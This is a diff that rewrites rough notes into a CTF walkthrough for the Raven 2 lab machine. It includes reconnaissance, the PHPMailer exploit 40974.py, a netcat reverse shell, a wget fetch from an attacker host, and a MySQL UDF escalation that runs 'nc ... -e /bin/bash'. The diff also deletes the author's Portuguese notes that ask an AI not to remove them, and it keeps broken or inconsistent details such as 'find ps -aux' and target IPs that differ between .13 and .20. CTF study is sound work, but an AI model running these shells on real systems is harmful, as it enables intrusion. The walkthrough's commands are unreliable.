@@ -1,14 +1,26 @@
-# CTF Walkthrough
+# CTF Walkthrough: Raven Machine
+
+https://www.vulnhub.com/entry/raven-2,269/
 
 ## Machine Details
-- **Target IP:** 10.10.10.X
-- **Difficulty:** [Easy/Medium/Hard]
-- **Technologies:** [List relevant technologies]
+- **Target IP:** 10.10.10.13
+- **Difficulty:** Medium
+- **Technologies:** 
+  - Debian Linux
+  - Apache 2.4.10
+  - OpenSSH 6.7p1
+  - WordPress
+  - MySQL
 
 ## 1. Setup Instructions
-- Prepare virtual machine
+- Prepare Kali Linux virtual machine
 - Configure network settings
-- Ensure necessary tools are installed
+- Install necessary penetration testing tools
+  - nmap
+  - dirb
+  - searchsploit
+  - netcat
+  - python
 
 ## 2. Reconnaissance (Recon)
 
@@ -22,163 +34,152 @@ nmap -sV -v -Pn 10.10.10.13
 nmap -sC -A -v -p- 10.10.10.13
 ```
 
+### Scan Results
+```
 PORT    STATE SERVICE VERSION
 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
 80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
 111/tcp open  rpcbind 2-4 (RPC #100000)
 MAC Address: 08:00:27:14:CC:04 (Oracle VirtualBox virtual NIC)
-
-### Scan Results
-```
-PORT    STATE SERVICE VERSION
-22/tcp  open  service Details
-80/tcp  open  service Details
 ```
 
 ## 3. Enumeration
-- Identify services
-- Look for potential vulnerabilities
-- Check configuration files
-- Explore web applications
 
+### Web Directory Exploration
+```bash
 dirb http://10.10.10.20 /usr/share/wordlists/dirb/big.txt
+```
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
+### Discovered Directories
+- `/css/`
+- `/fonts/`
+- `/img/`
+- `/js/`
+- `/manual/`
+- `/vendor/` 
+- `/wordpress/`
 
-START_TIME: Thu Dec 12 09:50:42 2024
-URL_BASE: http://10.10.10.20/
-WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
-
------------------
-
-GENERATED WORDS: 20458                                                         
-
----- Scanning URL: http://10.10.10.20/ ----
-==> DIRECTORY: http://10.10.10.20/css/                                                                                           
-==> DIRECTORY: http://10.10.10.20/fonts/                                                                                         
-==> DIRECTORY: http://10.10.10.20/img/                                                                                           
-==> DIRECTORY: http://10.10.10.20/js/                                                                                            
-==> DIRECTORY: http://10.10.10.20/manual/                                                                                        
-+ http://10.10.10.20/server-status (CODE:403|SIZE:299)                                                                           
-==> DIRECTORY: http://10.10.10.20/vendor/                    ** IA não apague isso aqui : vendor vamos acessar no navegador **                                                                               
-==> DIRECTORY: http://10.10.10.20/wordpress/                                                                                     
-                                                                   
-http://10.10.10.20/wordpress/wp-content/uploads/       ** aqui vc encontra uma flag
-
+### Key Observations
+- `http://10.10.10.20/wordpress/wp-content/uploads/` contains a flag
+- `server-status` endpoint returns 403 Forbidden
 
 ## 4. Vulnerability Identification
 
-### Vulnerability Discovery
-- **Vulnerable Version:** 
-- **Exploit Source:** 
-
-### Vulnerability Details
-⚠️ **Vulnerability Name**
-- Detailed vulnerability description
-- Potential impact
-
-### Exploit Preparation
+### Initial Vulnerability Research
 ```bash
-# Exploit execution commands
+# Search for PHPMailer exploits
+searchsploit phpmailer
+
+# Copy specific exploit
+searchsploit -m 40974.py
 ```
-searchsploit   phpmailer 
 
-searchsploit   -m 40974.py     **  -m > indica que fara uma copia para o local onde estamos ** IA é proibido vc apagar esse texto **
-
-
-
-### Important Exploitation Notes
-- Specific challenges
-- Potential modification requirements
-- Compatibility considerations
+### Exploit Preparation Notes
+⚠️ **Potential Installation Requirements**
+```bash
+# If requests_toolbelt module is missing
+pip3 install requests-toolbelt
+```
 
 ## 5. Exploitation Techniques
 
-### Primary Exploitation Method
+### Reverse Shell Establishment
 ```bash
-# Exploitation code/commands
+# Set up listener on attacker machine
+nc -nlvp 443
+
+# Open backdoor in browser
+/path/to/backdoor
+
+# Upgrade to interactive shell
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
-searchsploit 40974.py anarcoder
 
-abra no no navegador /nome do seu backdor
-
-nc -nlvp 443                     
-listening on [any] 443 ...
-connect to [10.10.10.4] from (UNKNOWN) [10.10.10.20] 59231
-/bin/sh: 0: can't access tty; job control turned off
+### Initial Access
+```bash
+# Verify initial access
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$ python -c 'import pty;pty.spawn("/bin/bash")'   
-www-data@Raven:/var/www/html$ id
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
+# Change to temporary directory
+cd /tmp
+```
 
+### Data Transfer Techniques
+```bash
+# Simple HTTP server on attacker machine
+python -m http.server <port>
 
-### Exploitation Steps
-1. Step-by-step exploitation process
-2. Detailed commands
-3. Potential variations
+# Download backdoor on target
+wget http://<attacker_ip>:<port>/backdoor
+```
 
 ## 6. Privilege Escalation
 
-### Privilege Escalation Techniques
+### MySQL Exploitation Method
+```sql
+# Select MySQL database
+use mysql
+
+# Create blob table
+CREATE TABLE bb (line BLOB);
+
+# Load malicious library
+INSERT INTO bb VALUES(LOAD_FILE('/tmp/mysql20.so'));
+
+# Move library to plugin directory
+SELECT * FROM bb INTO DUMPFILE '/usr/lib/mysql/plugin/mysql20.so';
+
+# Verify plugin directory
+SHOW VARIABLES LIKE 'plugin_dir';
+
+# Create system function
+CREATE FUNCTION do_system RETURNS INTEGER SONAME 'mysql20.so';
+
+# Execute reverse shell
+select do_system('nc 10.10.10.4 80 -e /bin/bash');
+```
+
+### Privilege Escalation Notes
+- Verify root processes
 ```bash
-# Privilege escalation commands
-find / -perm -u=s -type f 2>/dev/null
+find ps -aux | grep root
 ```
 
 ## 7. Post-Exploitation
-- Maintain system access
-- Collect additional information
-- Identify further exploitation paths
-
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@Raven:/var/www/html$ find ps -aux | grep root
-
-
+- Maintained system access
+- Explored system information
+- Identified potential further exploitation paths
 
 ## 8. Flag Collection
-```bash
-# Typical flag locations
-cd /root
-cat *flag*.txt
-```
+- Check WordPress uploads directory
+- Search for flag files in various locations
 
 ## 9. Conclusion
-- Summarize exploitation technique
-- Document lessons learned
-- Note effective tools and methods
+- Successfully exploited MySQL functionality
+- Gained www-data shell
+- Demonstrated potential privilege escalation
 
 ## 10. Recommendations
-- Security improvements
-- Patch recommendations
-- Best practices
+- Update PHPMailer to latest version
+- Restrict MySQL plugin directory permissions
+- Implement stronger input validation
 
 ## Appendix: Potential Challenges
-- Specific technical challenges
-- Debugging tips
-- Potential roadblocks
 
-### References
-- [Relevant Security Resources]
-- [Exploit Details]
+### Technical Challenges
+- Module compatibility issues
+- Precise exploit modification
+- Shell stabilization
+
+### Debugging Tips
+- Always verify module installations
+- Check full library paths
+- Use systematic exploitation approach
 
 ## Author's Notes
-🔍 **Debugging Tips:**
-- Key insights
-- Personal observations
-- Lessons learned
-
-no ao usar o sploit 4097.py se der erro:
-
-Traceback (most recent call last):
-  File "/home/kali/40974.py", line 26, in <module>
-    from requests_toolbelt import MultipartEncoder
-ModuleNotFoundError: No module named 'requests_toolbelt'
-
-instale o pip3 install requests-toolbelt
+🔍 **Key Insights**
+- Exploit paths may require customization
+- Persistent testing is crucial
+- Always have backup exploitation strategies
 
